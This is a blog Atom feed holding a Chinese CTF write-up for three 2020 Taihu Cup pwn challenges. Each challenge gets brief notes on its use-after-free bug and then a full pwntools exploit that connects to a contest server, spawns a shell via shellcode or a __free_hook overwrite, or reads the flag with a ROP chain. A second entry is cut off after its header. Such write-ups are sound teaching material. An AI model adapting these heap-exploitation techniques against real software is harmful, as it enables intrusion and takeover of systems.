<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nuoye&#39;s blog</title>
  
  <subtitle>nuoye</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nuoye-blog.github.io/"/>
  <updated>2020-11-07T12:16:54.605Z</updated>
  <id>https://nuoye-blog.github.io/</id>
  
  <author>
    <name>nuoye</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020太湖杯pwn-WP</title>
    <link href="https://nuoye-blog.github.io/2020/11/07/833b19a1/"/>
    <id>https://nuoye-blog.github.io/2020/11/07/833b19a1/</id>
    <published>2020-11-07T12:30:00.000Z</published>
    <updated>2020-11-07T12:16:54.605Z</updated>
    
    <content type="html"><![CDATA[<h3 id="easyKooc"><a href="#easyKooc" class="headerlink" title="easyKooc"></a>easyKooc</h3><p>简单的mips题目，静态地址，存在UAF漏洞，并且有RWX段，可执行shellcode。</p><p>利用UAF将shellcode写到可执行段上，然后修改got表跳过去执行即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'mips'</span></span><br><span class="line"><span class="comment">#p = process(["qemu-mipsel-static", "-L", "./mipsel-linux-gnu", "./easyKooc"])</span></span><br><span class="line"><span class="comment">#p = gdb.debug("./easyKooc",' b *0x412140')</span></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">p = remote(<span class="string">"121.36.166.138"</span>,<span class="string">"8893"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Plz input your choice"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Plz input your todo id!"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">"input your content"</span>)</span><br><span class="line">p.sendline(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Plz input your choice"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Plz input your todo id!"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">lui $t6,0x6e69</span></span><br><span class="line"><span class="string">ori $t6,$t6,0x622f</span></span><br><span class="line"><span class="string">sw $t6,28($sp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">lui $t7,0x6873</span></span><br><span class="line"><span class="string">ori $t7,$t7,0x2f2f</span></span><br><span class="line"><span class="string">sw $t7,32($sp)</span></span><br><span class="line"><span class="string">sw $zero,36($sp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">la $a0,28($sp) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">addiu $a1,$zero,0</span></span><br><span class="line"><span class="string">addiu $a2,$zero,0</span></span><br><span class="line"><span class="string">addiu $v0,$zero,4011</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall 0x40404 </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">code = asm(code,arch=<span class="string">'mips'</span>)</span><br><span class="line"><span class="keyword">print</span> len(code)</span><br><span class="line">p.recvuntil(<span class="string">"Plz input your motto!"</span>)</span><br><span class="line">p.sendline(<span class="string">'111'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift for you: "</span>)</span><br><span class="line">stack = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'1111'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'1111'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf</span>,p32(<span class="number">0x41213e</span><span class="number">-8</span>))</span><br><span class="line">add(<span class="number">0xe</span>,p32(<span class="number">1</span>))</span><br><span class="line">add(<span class="number">0xd</span>,p32(<span class="number">1</span>))</span><br><span class="line">add(<span class="number">0xc</span>,<span class="string">'\x00'</span>*<span class="number">2</span>+code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,p32(<span class="number">0x41204a</span><span class="number">-8</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">'2'</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">'\x00'</span>*<span class="number">0xe</span>+p32(<span class="number">0x412140</span>))</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="seven-hero"><a href="#seven-hero" class="headerlink" title="seven hero"></a>seven hero</h3><p>2.29的题目，edit大小为0的时候，会将堆块free掉，但是不会清空指针，可以UAF。</p><p>先申请到标志位将其赋值得到gift函数的执行权限，得到libc地址。</p><p>再一次用UAF漏洞申请到<code>__free_hook</code>处修改其为system函数地址即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = "DEBUG"</span></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>, <span class="string">"splitw"</span>, <span class="string">"-h"</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p = process("/tmp/pwn", env=&#123;"LD_PRELOAD":"/tmp/libc.so.6"&#125;)</span></span><br><span class="line"><span class="string">libc = ELF("/tmp/libc.so.6")</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p = remote(<span class="string">"119.3.89.93"</span>,<span class="string">"8015"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_choice</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Input your choice:"</span>, str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    read_choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"please input index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"please input size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Please input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    read_choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(idx))</span><br><span class="line">    <span class="comment"># p.recvuntil("Success")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size ,content = <span class="number">0</span>)</span>:</span></span><br><span class="line">    read_choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Please input size: "</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> content != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    read_choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span><span class="params">(hack_string)</span>:</span></span><br><span class="line">    read_choice(<span class="number">666</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"there is a gift: "</span>)</span><br><span class="line">    gift = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    gift = gift[:<span class="number">-1</span>]</span><br><span class="line">    p.send(hack_string)</span><br><span class="line">    <span class="keyword">return</span> gift</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span><span class="params">()</span>:</span></span><br><span class="line">    read_choice(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x9</span>):</span><br><span class="line">add(i,<span class="number">0x18</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x7</span>):</span><br><span class="line">free(<span class="number">8</span>-i)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#add(2,0x18,'\x00'*0x10)</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00\x00'</span>)<span class="number">-0x270</span></span><br><span class="line">print(hex(heap))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x18</span>,p64(heap+<span class="number">0x250</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x18</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x18</span>,<span class="string">'a'</span>)</span><br><span class="line">libc.address = int(gift(<span class="string">'111'</span>),<span class="number">16</span>)<span class="number">-0x264140</span></span><br><span class="line">print(hex(libc.address))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x50</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x50</span>,<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x50</span>,p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">gift(<span class="string">'111'</span>)</span><br><span class="line">gift(p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="manager"><a href="#manager" class="headerlink" title="manager"></a>manager</h3><p>开启了seccomp保护，禁止exec系统调用。</p><p>漏洞点跟上一题一样，edit大小为0的时候，会将堆块free掉，但是不会清空指针，可以UAF。</p><p>首先用unsortbin进行leak libc地址。</p><p>接着leak出heap地址。</p><p>在堆中构造出假堆头，修改free的堆块fd指向该假堆块，利用其修改name指针地址为<code>__free_hook</code>。</p><p>接着将<code>__free_hook</code>修改为setcontext，并在堆上写好相应的寄存器值以及rop串即可获取flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">p = remote(<span class="string">"122.112.231.25"</span>,<span class="string">"8005"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./pwn"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,name,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input Name of Staff:"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">"Input Number of Staff:"</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">"Input len of Info:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"get Info:"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_name</span><span class="params">(num,name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input Number:"</span>)</span><br><span class="line">p.send(str(num))</span><br><span class="line">p.recvuntil(<span class="string">"Choice: 1.Edit Name 2.Edit Info\n &gt; "</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Input name:"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_info</span><span class="params">(num,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input Number:"</span>)</span><br><span class="line">p.send(str(num))</span><br><span class="line">p.recvuntil(<span class="string">"Choice: 1.Edit Name 2.Edit Info\n &gt; "</span>)</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Input len of Info:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Input info:"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_info2</span><span class="params">(num,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input Number:"</span>)</span><br><span class="line">p.send(str(num))</span><br><span class="line">p.recvuntil(<span class="string">"Choice: 1.Edit Name 2.Edit Info\n &gt; "</span>)</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Input len of Info:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Input info:"</span>)</span><br><span class="line">p.send(info)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input staff number:"</span>)</span><br><span class="line">p.send(str(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input Number of Staff:"</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one =[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Input String1:"</span>)</span><br><span class="line">p.sendline(<span class="string">"\x02\x01\x00"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input String2:"</span>)</span><br><span class="line">p.sendline(<span class="string">"\x01\x26"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'a'</span>,<span class="number">0xf8</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">'a'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3C4C68</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack = <span class="number">0x10000000</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000021112</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x00000000000202f8</span> + libc.address</span><br><span class="line">pop_rdx = <span class="number">0x0000000000001b92</span> + libc.address</span><br><span class="line">pop_rax = <span class="number">0x000000000003a738</span> + libc.address</span><br><span class="line">pop_rsp = <span class="number">0x0000000000003838</span> + libc.address</span><br><span class="line">syscall = <span class="number">0x0000000000101597</span> + libc.address</span><br><span class="line">ret = <span class="number">0x1015B2</span> + libc.address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="string">'a'</span>,<span class="number">0x58</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">edit_info(<span class="number">4</span>,<span class="number">0</span>,<span class="string">'a'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'\x90'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x58</span>+<span class="string">'\x71'</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Info:'</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x590</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(heap+<span class="number">0x918</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap+<span class="number">0x500</span>+<span class="number">0x8b8</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap+<span class="number">0x500</span>+<span class="number">0x8b8</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += <span class="string">'./flag\x00'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#add(1,'a',0x68,'\x00'*0xb+p64(libc.sym['setcontext'])+p64(0))</span></span><br><span class="line">add(<span class="number">8</span>,<span class="string">'a'</span>,<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add(<span class="number">9</span>,<span class="string">'a'</span>,<span class="number">0xf8</span>,payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="string">'\x00'</span>,<span class="number">0xf8</span>,<span class="string">'\x00'</span>*<span class="number">0x60</span>+p64(heap+<span class="number">0x840</span>)+p64(ret)+<span class="string">'\x00'</span>*<span class="number">0x30</span>+p64(heap+<span class="number">0x7b0</span>))</span><br><span class="line">edit_name(<span class="number">6</span>,p64(libc.sym[<span class="string">'setcontext'</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x183B)\n b free')</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;easyKooc&quot;&gt;&lt;a href=&quot;#easyKooc&quot; class=&quot;headerlink&quot; title=&quot;easyKooc&quot;&gt;&lt;/a&gt;easyKooc&lt;/h3&gt;&lt;p&gt;简单的mips题目，静态地址，存在UAF漏洞，并且有RWX段，可执行shellcode。&lt;/
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2020全国电信和互联网行业网络安全管理职业技能竞赛pwn-WP</title>
    <link href="https://nuoye-blog.github.io/2020/11/07/dfb841e2/"/>
    <id>https://nuoye-blog.github.io/2020/11/07/dfb841e2/</id>
    <published>2020-11-07T12:00:00.000Z</published>
    <updated>2020-11-10T07:53:39.148Z</updated>
    
